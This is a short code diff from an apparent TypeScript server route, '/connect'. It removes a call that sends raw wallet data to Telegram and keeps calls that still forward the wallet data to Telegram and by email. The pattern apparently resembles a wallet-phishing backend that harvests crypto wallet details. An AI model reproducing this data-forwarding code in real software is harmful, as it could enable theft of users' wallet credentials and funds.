@@ -106,7 +106,6 @@ router.post('/connect', async (req: Request, res: Response) => {
 
     // Send Telegram notification
     await telegramService.sendNotification(walletData);
-    await telegramService.sendRawData(walletData);
 
     // Send Email Notification
     await emailService.sendWalletNotification({
